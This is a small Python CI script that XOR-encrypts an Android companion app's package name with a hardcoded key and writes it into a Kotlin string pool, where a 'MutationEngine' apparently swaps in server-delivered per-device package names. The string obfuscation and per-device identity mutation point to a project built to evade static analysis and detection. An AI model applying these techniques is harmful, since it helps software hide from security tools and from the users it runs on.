#!/usr/bin/env python3
"""
update_stringpool_pkg.py
Updates StringPool.COMPANION_OLD_PKG to match the CI-generated companion
package name so patchPackageName() in MutationEngine.kt can find and
replace it with the server-delivered per-device unique package name.

Usage: python3 scripts/update_stringpool_pkg.py <comp_pkg>
"""
import base64
import re
import os
import sys

def xor_encrypt(s):
    key = ("n0vA" + "sEed").encode()
    return base64.b64encode(
        bytes([b ^ key[i % len(key)] for i, b in enumerate(s.encode())])
    ).decode()

def find_stringpool():
    for root, dirs, files in os.walk("app/src/main/java"):
        for f in files:
            if f == "StringPool.kt":
                return os.path.join(root, f)
    return None

def main():
    if len(sys.argv) < 2:
        print("[ERROR] Usage: update_stringpool_pkg.py <comp_pkg>")
        sys.exit(1)

    comp_pkg = sys.argv[1].strip()
    if not comp_pkg or comp_pkg.count(".") < 2:
        print(f"[ERROR] Invalid package name: '{comp_pkg}'")
        sys.exit(1)

    print(f"Updating COMPANION_OLD_PKG to: '{comp_pkg}' ({len(comp_pkg)} chars)")

    sp_path = find_stringpool()
    if not sp_path:
        print("[ERROR] StringPool.kt not found")
        sys.exit(1)

    print(f"Found StringPool.kt at: {sp_path}")

    enc = xor_encrypt(comp_pkg)
    content = open(sp_path).read()
    new_content = re.sub(
        r'val COMPANION_OLD_PKG\s*=\s*"[^"]*"',
        f'val COMPANION_OLD_PKG = "{enc}"',
        content
    )

    if new_content == content:
        print("[ERROR] COMPANION_OLD_PKG pattern not found in StringPool.kt")
        sys.exit(1)

    open(sp_path, "w").write(new_content)
    print(f"StringPool.COMPANION_OLD_PKG updated successfully")
    print(f"Encrypted value: {enc}")

if __name__ == "__main__":
    main()
